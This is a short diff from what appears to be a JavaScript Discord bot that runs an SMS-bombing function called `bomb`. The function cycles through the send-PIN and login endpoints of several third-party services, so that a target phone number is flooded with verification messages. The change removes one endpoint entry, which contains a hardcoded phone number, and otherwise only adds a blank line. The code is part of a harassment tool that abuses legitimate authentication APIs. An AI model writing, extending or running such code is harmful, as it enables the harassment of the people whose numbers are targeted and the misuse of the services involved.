@@ -33,14 +33,6 @@ async function bomb(number) {
         phone: number,
       },
     },
-    {
-      url: "https://api.torob.com/v4/user/phone/send-pin/?phone_number=09927208939&_http_referrer=https%3A%2F%2Fwww.google.com%2F&source=next_desktop",
-      method: "GET",
-      data: {
-        phone_number: number,
-        _http_referrer: "https://www.google.com/",
-        source: "next_desktop",
-      },
     },
     {
       url: "https://www.irantic.com/api/login/authenticate",
@@ -420,4 +412,5 @@ const client = new Client({
 });
 
 client.login(BOT_TOKEN)
+
 
